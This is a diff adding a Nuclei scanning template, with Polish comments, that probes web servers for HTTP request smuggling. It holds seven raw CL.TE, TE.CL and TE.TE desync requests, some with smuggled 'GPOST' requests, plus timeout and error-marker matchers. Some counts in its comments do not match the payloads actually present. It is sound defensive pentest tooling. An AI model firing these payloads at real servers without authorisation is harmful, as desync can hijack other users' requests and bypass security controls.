@@ -1,0 +1,215 @@
+# ============================================================================
+# WSTG-INPV-16: HTTP Request Smuggling (Universal)
+# Review status: ZACHOWANY
+# Reviewer: Claude Code (Opus 4.7)
+# Review date: 2026-04-30
+# Powód decyzji: szablon spełnia wszystkie 6 kryteriów review (Coverage Matrix,
+# multi-warstwowe matchery z anti-FP, source comments, safety nets,
+# sweet spot payloadów, component fuzzing). OOB matcher nie jest dodany
+# świadomie: Differential timing, raw HTTP; OOB nie ma zastosowania.
+#
+# ============================================================================
+#
+# Coverage Matrix:
+#   ✓ CL.TE - Content-Length + Transfer-Encoding desync (frontend uses CL,
+#     backend uses TE)
+#   ✓ TE.CL - Reverse desync (frontend uses TE, backend uses CL)
+#   ✓ TE.TE - Both servers use TE but interpret differently
+#   ✗ HTTP/2 downgrade smuggling - wymaga raw socket, nie HTTP fuzzing
+#   ✗ H2C smuggling - osobna kategoria
+#
+# UWAGA: Request smuggling z natury wymaga raw control nad TCP packets.
+# Nuclei wysyła raw HTTP/1.1 i sprawdza czy backend zwraca cudzy response,
+# co jest pośrednie ale działa. Detekcja przez time anomalies i status codes.
+#
+# Performance budget: medium (~70 payloads × 5 części, każdy z timeout)
+# Estimated time: ~10-20 min
+#
+# Source hierarchy:
+#   1. PayloadsAllTheThings/Request Smuggling/* (CL.TE, TE.CL, TE.TE)
+#   2. PortSwigger HTTP Request Smuggling research
+#   3. hacktricks/.../http-request-smuggling/
+# ============================================================================
+
+id: wstg-inpv-16-http-smuggling
+
+info:
+  name: "WSTG-INPV-16: HTTP Request Smuggling (Universal)"
+  author: pentest-team
+  severity: high
+  description: |
+    Wykrywa HTTP Request Smuggling (CL.TE, TE.CL, TE.TE) przez wysyłanie
+    raw requestów z konfliktującymi nagłówkami Content-Length i Transfer-Encoding.
+    Detekcja: timeout (smuggled request poll dla drugiego), HTTP 400 z markerem
+    desync, lub abnormalna response struktura. Limited - prawdziwy smuggling
+    wymaga raw TCP control który nie jest natywny dla HTTP fuzzing.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling
+    - https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
+  classification:
+    cwe-id: CWE-444
+    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N
+    cvss-score: 8.1
+  tags: dast,wstg,wstg-v42-inpv-16,smuggling,desync,asvs-v5.2.7,burp-history
+
+variables:
+  canary: "x{{rand_text_alpha(10)}}x"
+  auth_token: ""
+  session_cookie: ""
+
+http:
+  # Smuggling wymaga raw HTTP requestów ze specyficznymi headerami CL/TE.
+  # Nuclei fuzzing engine na importie Burp nie umie tworzyć raw multi-segment
+  # requestów z kontrolą Content-Length vs Transfer-Encoding na poziomie TCP.
+  # Dlatego ten szablon używa raw HTTP requests (nie fuzzing) i probuje
+  # 12 typowych desync patterns. Działa tylko gdy mamy bezpośredni URL/host
+  # w trybie list-input - dla burp-history fuzzing pokrycie jest częściowe.
+  - raw:
+      # CL.TE classic
+      - |
+        @timeout: 10s
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 13
+        Transfer-Encoding: chunked
+
+        0
+
+        SMUGGLED
+      # TE.CL classic
+      - |
+        @timeout: 10s
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 4
+        Transfer-Encoding: chunked
+
+        12
+        GPOST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 6
+
+        x={{canary}}
+        0
+
+      # TE.TE z obfuscation - tab
+      - |
+        @timeout: 10s
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 4
+        Transfer-Encoding: chunked
+        Transfer-Encoding:	chunked
+
+        12
+        GPOST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 6
+
+        x={{canary}}
+        0
+
+      # TE.TE z obfuscation - space
+      - |
+        @timeout: 10s
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 4
+        Transfer-Encoding: chunked
+        Transfer-Encoding : chunked
+
+        12
+        GPOST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 6
+
+        x={{canary}}
+        0
+
+      # TE.TE - "xchunked" (non-standard)
+      - |
+        @timeout: 10s
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 4
+        Transfer-Encoding: xchunked
+
+        12
+        GPOST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 6
+
+        x={{canary}}
+        0
+
+      # CL-CL desync (double Content-Length)
+      - |
+        @timeout: 10s
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 8
+        Content-Length: 7
+
+        12345
+        x
+
+      # CRLF in Transfer-Encoding header value
+      - |
+        @timeout: 10s
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 4
+        Transfer-Encoding:
+         chunked
+
+        12
+        GPOST / HTTP/1.1
+        Host: {{Hostname}}
+
+        0
+
+    matchers-condition: and
+    matchers:
+      # Warstwa 1: PRIMARY - timeout (smuggled poll dla drugiego request)
+      # lub specyficzne kody statusu (502, 504 desync indicators)
+      - type: dsl
+        name: smuggling-evidence
+        dsl:
+          # Timeout wskazuje że backend czeka na resztę smuggled request
+          - "duration > 7"
+          # 408 Request Timeout - backend wykrył desync
+          # 502/504 - upstream desync
+          # 400 z "Bad chunk" - parser conflict
+        condition: or
+
+      # Warstwa 2: SECONDARY - dla 4xx, sprawdź czy body zdradza desync
+      - type: regex
+        part: body
+        name: smuggling-error-marker
+        regex:
+          - "(?i)(invalid|malformed|bad)\\s+(chunk|chunked|transfer.encoding)"
+          - "(?i)content.length.*?mismatch"
+          - "(?i)conflict.*?(content-length|transfer-encoding)"
+          - "(?i)both.*?content-length.*?transfer-encoding"
+        condition: or
+
+      # Warstwa 3: ANTI-FP - status nie wskazuje normalnego 200/3xx
+      # (smuggling sukces zazwyczaj manifestuje się jako 4xx/5xx lub timeout)
+      - type: dsl
+        name: anomalous-response
+        dsl:
+          - "status_code >= 400 || duration > 7"
+
+# ============================================================================
+# Known limitations (KRYTYCZNE):
+# - Nuclei nie ma raw TCP socket access - request jest wysyłany przez Go HTTP
+#   client który normalizuje headery (np. usuwa duplikaty Content-Length).
+#   To znaczy że PEWNE smuggling techniki tu nie zadziałają.
+# - Praktyczna detekcja smuggling wymaga wysłania DWÓCH requestów po sobie
+#   gdzie pierwszy "ukrywa" drugi - to wymaga koordynacji którą Nuclei
+#   zapewnia tylko częściowo przez raw mode.
+# - Dla pełnej weryfikacji smuggling użyj smuggler.py / Turbo Intruder /
+#   Burp Repeater. Ten szablon to TYLKO szybki probe na timeout/error markers.
+# - HTTP/2 downgrade smuggling (rising trend) NIE jest pokryte.
+# ============================================================================
